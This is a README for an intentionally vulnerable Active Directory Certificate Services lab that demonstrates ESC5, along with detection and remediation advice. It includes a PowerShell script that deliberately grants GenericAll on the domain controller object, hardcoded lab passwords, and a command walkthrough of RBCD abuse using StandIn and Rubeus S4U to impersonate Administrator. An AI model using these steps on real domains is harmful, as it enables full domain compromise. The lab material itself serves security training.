# ADCS ESC5 Lab - Vulnerable PKI Object Access Control

> **⚠️ WARNING**: This is an intentionally vulnerable lab environment for educational purposes only. Do NOT deploy in production!

## Overview

Fully automated Active Directory Certificate Services lab demonstrating **ESC5 vulnerability** - excessive administrative permissions on critical PKI objects (CA server, Certificate Templates container, etc.) allow an attacker to totally compromise the PKI system.

### What is ESC5?

ESC5 refers to vulnerable Access Control Lists (ACLs) on AD CS objects in Active Directory. If a low-privileged user has dangerous permissions (like `GenericAll`, `WriteDacl`, `WriteProperty`) on:
1.  The **Certificate Authority (CA)** computer object
2.  The **Certificate Templates** container
3.  The **Certification Authorities** container
4.  The **NTAuthCertificates** object

They can leverage this access to compromise the CA, modify settings, or issue malicious certificates.

---

## Lab Architecture

```
┌──────────────────────────────────────┐
│   Host-Only Network: 192.168.57.0/24│
│   Gateway: (Isolated)                │
└──────────────────────────────────────┘
           │
    ┌──────┴───────┐
    │              │
┌───▼────┐    ┌───▼────┐
│ESC5-DC │    │CLT-01  │
│Win2019 │    │ Win 10 │
└────────┘    └────────┘
.57.24        .57.25

Domain: adcs.local
CA: ADCS-CA-ESC5 (Manual Installation)
Vulnerability: 'janesmith' has GenericAll on CA Computer Object
```

---

## Prerequisites

- **VirtualBox** 7.x
- **Vagrant** 2.3+
- **12GB RAM** minimum (DC: 8GB, CLIENT: 4GB)
- **50GB free disk space**

---

## Provisioning Walkthrough

### 1. Prerequisites Check
Ensure VirtualBox and Vagrant are installed and you have sufficient RAM.

### 2. Start the Domain Controller
The DC setup automates AD DS installation but requires manual CA setup.

1.  **Launch the DC**:
    ```powershell
    cd E:\ADCS\adcs-esc5-lab
    vagrant up dc
    ```

2.  **What to Expect**:
    -   Vagrant imports `mayfly/windows_server2019`.
    -   Script 1: Sets hostname to `ESC5-DC` -> Reboot.
    -   Script 2: Installs AD DS (Domain: `adcs.local`) -> Reboot.
    -   Script 3: Adds lab users.

### 3. Manual Certificate Authority Installation
1.  **Log in to DC**:
    -   RDP to `192.168.57.24`.
    -   User: `Administrator` / `P@ssw0rd!123`.
2.  **Install Role**:
    -   Server Manager > Add Roles > **Active Directory Certificate Services**.
    -   Select **Certification Authority**.
3.  **Configure CA**:
    -   Type: **Enterprise CA**.
    -   CA Type: **Root CA**.
    -   Key: **RSA 2048**, SHA256.
    -   Name: `ADCS-CA-ESC5`.
    -   Validity: 5 Years.

### 4. Configure ESC5 Vulnerability (Manual)
We must manually grant the dangerous permission to simulate the misconfiguration.

1.  Open **PowerShell (Admin)** on the DC.
2.  Run this script to grant `GenericAll` to `janesmith` on the CA computer object:

    ```powershell
    Import-Module ActiveDirectory
    $victim = "CN=ESC5-DC,OU=Domain Controllers,DC=adcs,DC=local"
    $attacker = "ADCS\janesmith"
    
    $acl = Get-Acl "AD:\$victim"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        (New-Object System.Security.Principal.NTAccount($attacker)),
        "GenericAll", 
        "Allow"
    )
    $acl.AddAccessRule($rule)
    Set-Acl "AD:\$victim" $acl
    
    Write-Host "[!] Vulnerability Configured: $attacker owns $victim" -ForegroundColor Red
    ```

### 5. Provision the Client
1.  **Launch Client**:
    ```powershell
    vagrant up client
    ```
2.  **Verify**: Log in as `ADCS\johndoe` / `Summer2024!`.

---

## Lab Credentials

| Username | Password | Email | Role |
|----------|----------|-------|------|
| `ADCS\Administrator` | `P@ssw0rd!123` | - | Domain Admin |
| `ADCS\johndoe` | `Summer2024!` | johndoe@adcs.local | User |
| `ADCS\janesmith` | `Winter2024!` | janesmith@adcs.local | **Attacker** (Has Permissions) |
| `ADCS\alicejohnson` | `Spring2024!` | alicejohnson@adcs.local | User |
| `ADCS\bobwilliams` | `Autumn2024!` | bobwilliams@adcs.local | User |
| `ADCS\charliebrown` | `Coffee2024!` | charliebrown@adcs.local | User |

---

## ESC5 Attack Walkthrough

### 1. Discovery
Attackers look for ACLs where they have control over AD CS objects.

```powershell
# From ESC5-CLIENT as janesmith
# Use Certify to find vulnerable ACLs
.\Certify.exe find /vulnerable

# Look for:
#   Vulnerable Permissions on CA
#   Principal: adcs\janesmith
#   Access:    GenericAll
```

### 2. Exploitation (RBCD)
Since `janesmith` has `GenericAll` on the DC/CA Computer Object (`ESC5-DC`), she can configure **Resource-Based Constrained Delegation (RBCD)** to compromise the server.

**Tools Required**: `StandIn.exe` and `Rubeus.exe`.

1.  **Create a fake machine account** (we need one to perform the delegation):
    ```powershell
    .\StandIn.exe --computer --name FakeComp --pass Password123
    ```

2.  **Grant Delegation**:
    Tell `ESC5-DC` to trust `FakeComp` for delegation (abusing GenericAll to write `msDS-AllowedToActOnBehalfOfOtherIdentity`).
    ```powershell
    .\StandIn.exe --target ESC5-DC --grant FakeComp
    ```

3.  **Execute the Attack (S4U)**:
    Use the fake computer to request a Service Ticket (TGS) for the `cifs` service on `ESC5-DC`, masquerading as `Administrator`.
    ```powershell
    .\Rubeus.exe s4u /user:FakeComp$ /rc4:<FakeCompHash> /impersonateuser:Administrator /msdsspn:cifs/ESC5-DC.adcs.local /ptt
    ```
    *(Note: You can get the RC4 hash of FakeComp during creation or convert the password).*

4.  **Access the Target**:
    With the ticket in memory (`/ptt`), access the C$ share or DCSync.
    ```powershell
    dir \\ESC5-DC\c$
    ```

---

## Detection

### Event IDs
| Event ID | Source | Description |
|----------|--------|-------------|
| 5136 | Security | Directory Service object modified (ACL changes) |
| 4662 | Security | Operation performed on object (ACL check) |

### Detection Strategy
Monitor for ACL changes on critical AD CS objects:
-   `CN=Certification Authorities,CN=Public Key Services,CN=Services,...`
-   `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`
-   Domain Controller Computer Objects calling AD CS functions.

---

## Remediation

1.  **Audit ACLs**: Regularly check permissions on all PKI infrastructure objects using tools like `BloodHound` or `AdcsHunter`.
2.  **Principle of Least Privilege**: Ensure only Tier 0 admins have `GenericAll`, `WriteDacl`, or `WriteProperty` on these objects.

---

## Lab Management

```powershell
vagrant up      # Start Environment
vagrant destroy # Delete Environment
```

